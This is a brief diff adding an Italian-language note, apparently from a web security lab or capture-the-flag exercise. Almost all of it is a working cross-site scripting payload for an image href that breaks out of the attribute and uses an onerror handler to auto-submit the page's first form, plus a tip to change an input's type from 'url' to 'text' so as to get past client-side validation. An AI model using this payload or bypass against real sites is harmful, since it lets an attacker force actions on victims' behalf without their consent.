@@ -1,0 +1,5 @@
+In href immagine:
+
+ilnulla" onerror="document.getElementsByTagName('form')[0].submit()
+
+Per submit: type="url" -> type="text"
